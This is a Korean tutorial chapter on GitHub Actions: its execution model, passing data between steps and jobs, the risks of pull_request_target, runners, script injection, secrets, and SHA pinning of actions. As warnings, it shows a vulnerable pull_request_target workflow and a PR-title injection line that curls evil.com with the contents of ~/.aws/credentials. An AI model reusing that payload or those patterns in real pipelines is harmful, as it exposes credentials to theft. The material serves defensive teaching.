# 이론 — 실행 모델, 트리거의 정치학, 컨텍스트와 시크릿

> **🌱 17세 눈높이 비유: 학교 방송실**
> - **이벤트** = 종이 울림 / 화재경보 / 교장선생님의 요청 — 방송을 시작할 이유
> - **워크플로** = 그 이유에 대응하는 방송 대본 한 편 (`.github/workflows/ci.yml`)
> - **잡** = 방송을 진행할 **각각 다른 방** — 두 방은 서로의 책상 위 물건을 볼 수 없습니다(파일시스템 격리). 대신 동시에 진행됩니다
> - **스텝** = 한 방 안에서의 순서 — 같은 책상을 쓰니 물건(파일)은 공유됩니다. 그런데 **사람이 매번 바뀝니다** — 앞사람이 머릿속에 기억한 것(셸 변수)은 사라지고, 책상에 적어둔 것(파일·`$GITHUB_ENV`)만 남습니다
> - **시크릿** = 금고 열쇠. 외부인(포크 PR)이 진행하는 방송에는 열쇠를 주지 않습니다 — 이 규칙을 우회시키는 트리거가 `pull_request_target`이고, 그래서 위험합니다

---

## 1. 실행 모델 4층과 격리 경계

```
이벤트 (push / pull_request / schedule / workflow_dispatch / …)
  │
  └─ 워크플로 (.github/workflows/ci.yml)
       ├─ 잡 A ── 러너 VM #1 ── 스텝 1 → 스텝 2 → 스텝 3
       └─ 잡 B ── 러너 VM #2 ── 스텝 1 → 스텝 2
       ↑ 기본은 병렬. `needs:`로 순서를 만듭니다
```

| 경계 | 공유되는 것 | 공유 안 되는 것 |
|------|-----------|---------------|
| 스텝↔스텝 (같은 잡) | 파일시스템, 워크스페이스, `$GITHUB_ENV`로 넘긴 변수 | **셸 변수**(각 스텝은 새 셸 프로세스) |
| 잡↔잡 | (아무것도) | 파일시스템 전부 — `outputs`나 `artifacts`로만 전달 |
| 워크플로↔워크플로 | 저장소 | 실행 컨텍스트 |

이 표 하나가 guide의 네 미스터리를 전부 설명합니다.

### 스텝 간 변수 전달의 정석

```yaml
- name: 값 만들기
  id: gen
  run: |
    echo "VERSION=1.2.3" >> "$GITHUB_ENV"        # 이후 스텝의 env로
    echo "sha=$(git rev-parse --short HEAD)" >> "$GITHUB_OUTPUT"   # steps.gen.outputs.sha
- name: 사용
  run: echo "$VERSION / ${{ steps.gen.outputs.sha }}"
```

> `export VAR=x`는 그 스텝의 셸에서만 삽니다. 파일(`$GITHUB_ENV`)에 적어야 다음 스텝이 읽습니다.

## 2. 잡 간 통신 3종

```yaml
jobs:
  build:
    outputs:
      image: ${{ steps.meta.outputs.tag }}       # ① outputs — 작은 문자열
    steps:
      - id: meta
        run: echo "tag=app:$GITHUB_SHA" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@v4          # ② artifacts — 파일(빌드 산출물)
        with: { name: dist, path: dist/ }

  deploy:
    needs: build                                  # ③ needs — 순서 + outputs 접근권
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist }
      - run: echo "deploying ${{ needs.build.outputs.image }}"
```

선택 기준: **작은 값 = outputs, 파일 = artifacts, 순서 = needs.** 그리고 잡을 나눌수록 병렬성을 얻지만 아티팩트 업/다운로드 비용이 듭니다 — 01의 "빠른 피드백"과 저울질.

## 3. 트리거의 정치학 — `pull_request` vs `pull_request_target`

| | `pull_request` | `pull_request_target` |
|---|---|---|
| 체크아웃 기본 | **PR의 코드**(신뢰 불가) | base 브랜치 코드(신뢰 가능) |
| 실행 컨텍스트 | PR의 머지 커밋 | **base 브랜치** |
| 포크 PR에서 시크릿 | ❌ 없음 (안전) | ✅ **있음** (위험!) |
| 권한(GITHUB_TOKEN) | 읽기 전용 | 쓰기 가능 |
| 용도 | 일반 CI | PR에 라벨/코멘트 달기 등 |

**고전적 사고**: `pull_request_target`을 쓰면서 PR의 코드를 체크아웃하고 빌드합니다 →

```yaml
# 🚨 절대 금지 패턴
on: pull_request_target
jobs:
  bad:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # 남의 코드를
      - run: npm install && npm test                                # 시크릿이 있는 곳에서 실행
```

공격자는 PR로 `package.json`의 `postinstall` 스크립트를 보내 시크릿을 유출합니다. 규칙: **`pull_request_target`에서는 PR 코드를 절대 실행하지 않습니다.** 포크 PR의 CI가 시크릿을 필요로 한다면 설계가 틀린 것입니다(21에서 OIDC와 환경 승인으로 풉니다).

### 무한 루프 방지

워크플로가 만든 push는 기본적으로 워크플로를 다시 트리거하지 않습니다(GITHUB_TOKEN 사용 시). 하지만 PAT로 push하면 트리거됩니다 — 무한 루프의 정체. 그리고 `paths-ignore`/`concurrency`로 불필요한 실행을 줄입니다:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true      # 새 push가 오면 이전 실행 취소 (러너 비용·대기 절감)
```

## 4. 러너 — 코드가 실행되는 장소

| | GitHub-hosted | self-hosted (08) |
|---|---|---|
| 수명 | 잡마다 **새 VM**, 끝나면 파괴 | 우리가 관리 (재사용 시 오염 위험) |
| 격리 | 완전 | 우리 책임 |
| 네트워크 | 공용 인터넷 | VPC 내부 접근 가능 |
| 비용 | 분당 과금(퍼블릭 무료) | 인프라 비용 |

GitHub-hosted 러너가 **매번 깨끗한 VM**이라는 사실이 CI 재현성의 기반입니다 — "내 노트북에선 되는데"가 사라지는 이유이자, 캐시를 명시적으로 관리해야 하는 이유(빌드 캐시가 자동으로 남지 않습니다).

## 5. 컨텍스트·표현식·스크립트 인젝션

```yaml
${{ github.event.pull_request.title }}     # 표현식 — 러너에서 실행 "전에" 치환됩니다
```

이 치환이 `run:` 안으로 들어가면 **셸 코드가 됩니다**:

```yaml
# 🚨 인젝션 취약
- run: |
    echo "PR: ${{ github.event.pull_request.title }}"
#  PR 제목이  a"; curl evil.com/$(cat ~/.aws/credentials); #  이면?
```

방어: 사용자 입력(제목, 본문, 브랜치명, 커밋 메시지)은 **환경변수를 경유**시킵니다 —

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}    # 셸이 아니라 env로
  run: |                                             # 안전 (값으로만 전달)
    echo "PR: $TITLE"
```

원리: 표현식 치환은 셸 파싱 **이전**에 일어나므로 문자열이 코드가 될 수 있습니다. env는 값으로 전달되므로 코드가 되지 않습니다.

### 시크릿의 성질

- 로그에서 자동 마스킹(`***`)되지만 — base64로 인코딩해 출력하면 마스킹을 우회합니다(악의적 액션 주의)
- 포크 PR(`pull_request`)에는 전달되지 않습니다 — 안전장치이자 불편함의 원인
- `GITHUB_TOKEN`은 자동 발급되는 임시 토큰: **권한을 최소화**하세요
  ```yaml
  permissions:
    contents: read        # 기본을 읽기로 (저장소 설정에서 기본값 조정 가능)
    id-token: write       # OIDC가 필요할 때만 (07)
  ```

## 6. 액션(actions) 세 종류

| 종류 | 형태 | 예 |
|------|------|----|
| JavaScript | Node로 실행 | `actions/checkout` |
| Docker | 컨테이너 실행 | 커스텀 툴 |
| Composite | 스텝 묶음(YAML) | 사내 공통 스텝 |

**버전 고정의 규율**: `uses: actions/checkout@v4`는 태그이고, 태그는 **움직일 수 있습니다**. 공급망 보안(21) 관점의 정석은 SHA 고정:

```yaml
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608   # v4.1.0
```

## 7. 소스/도구에서 확인하기

- 워크플로 문법 레퍼런스: https://docs.github.com/actions/reference/workflow-syntax-for-github-actions
- 보안 강화 가이드(인젝션·pull_request_target): https://docs.github.com/actions/security-guides/security-hardening-for-github-actions
- actions/runner(러너 구현체 — 26에서 기여): https://github.com/actions/runner
- `act` — 로컬에서 워크플로 실행(완전 호환은 아니지만 디버깅에 유용)

## 요약 카드

| 질문 | 답 |
|------|----|
| 4층 구조? | 이벤트 → 워크플로 → 잡(러너 1대) → 스텝(같은 FS) |
| 스텝 간 변수? | 셸 변수는 안 넘어감 — `$GITHUB_ENV` / `$GITHUB_OUTPUT` |
| 잡 간 전달? | outputs(작은 값) / artifacts(파일) / needs(순서·의존) |
| `pull_request_target`의 위험? | 포크 PR에 **시크릿+쓰기 권한** — PR 코드를 절대 실행 말 것 |
| 인젝션 방어? | 사용자 입력은 `env:`로 경유 (표현식은 셸 파싱 전에 치환됨) |
| 러너의 성질? | 잡마다 새 VM — 재현성의 기반이자 캐시를 명시해야 하는 이유 |
| 액션 버전 고정? | 태그는 움직입니다 → **SHA 고정**(21) |
